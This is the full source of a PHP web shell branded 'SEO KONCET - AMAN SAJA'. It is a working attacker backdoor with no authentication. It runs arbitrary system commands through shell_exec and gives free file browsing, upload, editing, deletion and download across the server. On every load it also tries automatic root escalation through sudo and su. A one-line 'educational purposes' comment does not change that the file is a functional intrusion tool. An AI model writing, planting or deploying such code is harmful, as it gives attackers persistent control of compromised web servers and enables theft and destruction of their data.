<?php
header('Content-Type: text/html; charset=UTF-8');

// Set the default directory to the script's location
$default_dir = __DIR__;

// Check if a manual path is submitted via form, otherwise use GET or default
if (isset($_POST['manual_path']) && !empty($_POST['manual_path'])) {
    $current_dir = realpath($_POST['manual_path']) ?: $default_dir;
} else {
    $current_dir = isset($_GET['path']) ? realpath($_GET['path']) : $default_dir;
}

// Fallback to default directory if path is invalid
if (!$current_dir || !is_dir($current_dir)) {
    $current_dir = $default_dir;
}

// Handle file upload
if (isset($_FILES['upload_file']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    $upload_file = $current_dir . '/' . basename($_FILES['upload_file']['name']);
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_file);
}

// Handle file/directory deletion
if (isset($_GET['delete'])) {
    $file_to_delete = $current_dir . '/' . basename($_GET['delete']);
    if (is_file($file_to_delete)) {
        unlink($file_to_delete);
    } elseif (is_dir($file_to_delete)) {
        rmdir($file_to_delete);
    }
}

// Handle file editing
if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    $file_to_edit = $current_dir . '/' . basename($_POST['edit_file']);
    file_put_contents($file_to_edit, $_POST['file_content']);
}

// Handle system command execution
if (isset($_POST['command']) && !empty($_POST['command'])) {
    $command = $_POST['command'];
    $output = shell_exec($command . " 2>&1"); // Capture errors too
    $command_output = "<pre>" . htmlspecialchars($output) . "</pre>";
} else {
    $command_output = '';
}

// Attempt privilege escalation (WARNING: This is for educational purposes only)
function attemptRoot() {
    $attempts = [
        "whoami", // Check current user
        "sudo -u root whoami 2>/dev/null", // Try sudo if available
        "echo 'root' | su -c whoami 2>/dev/null", // Try su
        "id" // Check user ID
    ];
    $results = [];
    foreach ($attempts as $cmd) {
        $results[] = shell_exec($cmd);
    }
    return implode("\n", $results);
}
$root_attempt = attemptRoot();

// Handle file download
if (isset($_GET['download'])) {
    $file_to_download = $current_dir . '/' . basename($_GET['download']);
    if (is_file($file_to_download)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_to_download) . '"');
        readfile($file_to_download);
        exit;
    }
}

// Function to generate breadcrumb navigation
function generateBreadcrumbs($path, $default_dir) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumbs = [];
    $current_path = '';
    $breadcrumbs[] = "<a href='?path=/'>Root</a>";
    foreach ($parts as $part) {
        if (empty($part)) continue;
        $current_path .= '/' . $part;
        if (realpath($current_path)) {
            $breadcrumbs[] = "<a href='?path=" . urlencode($current_path) . "'>" . htmlspecialchars($part) . "</a>";
        }
    }
    return implode(' / ', $breadcrumbs);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SEO KONCET - AMAN SAJA</title>
    <style>
        body { font-family: 'Courier New', monospace; background: linear-gradient(135deg, #1a1a2e, #16213e); color: #e0e0e0; margin: 0; padding: 20px; }
        h1 { color: #00d4ff; text-align: center; text-shadow: 0 0 10px #00d4ff; }
        .container { max-width: 900px; margin: 0 auto; background: rgba(0, 0, 0, 0.7); padding: 20px; border-radius: 10px; box-shadow: 0 0 15px rgba(0, 212, 255, 0.5); }
        .breadcrumbs { margin: 10px 0; font-size: 14px; }
        .path-form, .upload-form, .command-form { margin: 20px 0; }
        .file-list { margin: 20px 0; }
        .file-item { padding: 10px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .file-item:hover { background: rgba(0, 212, 255, 0.1); }
        a { color: #00d4ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        .actions a { margin-left: 10px; color: #ff5555; }
        .actions a.download { color: #55ff55; }
        input[type="text"], input[type="file"], input[type="submit"], textarea { background: #333; color: #e0e0e0; border: 1px solid #00d4ff; padding: 8px; border-radius: 5px; }
        input[type="submit"] { background: #00d4ff; color: #1a1a2e; cursor: pointer; }
        input[type="submit"]:hover { background: #00b4d8; }
        textarea { width: 100%; min-height: 200px; resize: vertical; }
    </style>
</head>
<body>
    <div class="container">
        <h1>SEO KONCET - AMAN SAJA</h1>
        
        <!-- Breadcrumb Navigation -->
        <div class="breadcrumbs">
            <?php echo generateBreadcrumbs($current_dir, $default_dir); ?>
        </div>

        <!-- Manual Path Navigation Form -->
        <form class="path-form" method="post">
            <label for="manual_path">Go to Path:</label>
            <input type="text" name="manual_path" id="manual_path" value="<?php echo htmlspecialchars($current_dir); ?>" placeholder="e.g., /var/www/html">
            <input type="submit" value="Go">
        </form>

        <!-- File Upload Form -->
        <form class="upload-form" method="post" enctype="multipart/form-data">
            <label for="upload_file">Upload File:</label>
            <input type="file" name="upload_file" id="upload_file">
            <input type="submit" value="Upload">
        </form>

        <!-- System Command Form -->
        <form class="command-form" method="post">
            <label for="command">Run Command:</label>
            <input type="text" name="command" id="command" placeholder="e.g., whoami, chmod, etc.">
            <input type="submit" value="Execute">
        </form>
        <?php if (!empty($command_output)) echo "<h3>Command Output:</h3>" . $command_output; ?>
        <h3>Root Attempt:</h3><pre><?php echo htmlspecialchars($root_attempt); ?></pre>

        <!-- File and Directory Listing -->
        <div class="file-list">
            <?php
            $parent_dir = dirname($current_dir);
            if ($current_dir !== '/') {
                echo "<div class='file-item'><a href='?path=" . urlencode($parent_dir) . "'>[..] Parent Directory</a></div>";
            }

            $items = scandir($current_dir);
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $full_path = $current_dir . '/' . $item;
                $link = "?path=" . urlencode($full_path);
                $delete_link = "?path=" . urlencode($current_dir) . "&delete=" . urlencode($item);
                $download_link = "?path=" . urlencode($current_dir) . "&download=" . urlencode($item);

                if (is_dir($full_path)) {
                    echo "<div class='file-item'>";
                    echo "<a href='$link'>[DIR] " . htmlspecialchars($item) . "</a>";
                    echo "<span class='actions'><a href='$delete_link' onclick='return confirm(\"Are you sure?\")'>Delete</a></span>";
                    echo "</div>";
                } else {
                    echo "<div class='file-item'>";
                    echo "<a href='$link'>" . htmlspecialchars($item) . "</a>";
                    echo "<span class='actions'>";
                    echo "<a href='$delete_link' onclick='return confirm(\"Are you sure?\")'>Delete</a>";
                    echo " | <a href='?path=" . urlencode($current_dir) . "&edit=" . urlencode($item) . "'>Edit</a>";
                    echo " | <a href='$download_link' class='download'>Download</a>";
                    echo "</span>";
                    echo "</div>";
                }
            }
            ?>
        </div>

        <!-- File Editing Section -->
        <?php
        if (isset($_GET['edit'])) {
            $file_to_edit = $current_dir . '/' . basename($_GET['edit']);
            if (is_file($file_to_edit) && is_writable($file_to_edit)) {
                $content = file_get_contents($file_to_edit);
                echo "<h2>Editing: " . htmlspecialchars($_GET['edit']) . "</h2>";
                echo "<form method='post'>";
                echo "<textarea name='file_content'>" . htmlspecialchars($content) . "</textarea><br>";
                echo "<input type='hidden' name='edit_file' value='" . htmlspecialchars($_GET['edit']) . "'>";
                echo "<input type='submit' value='Save Changes'>";
                echo "</form>";
            }
        }
        ?>
    </div>
</body>
</html>
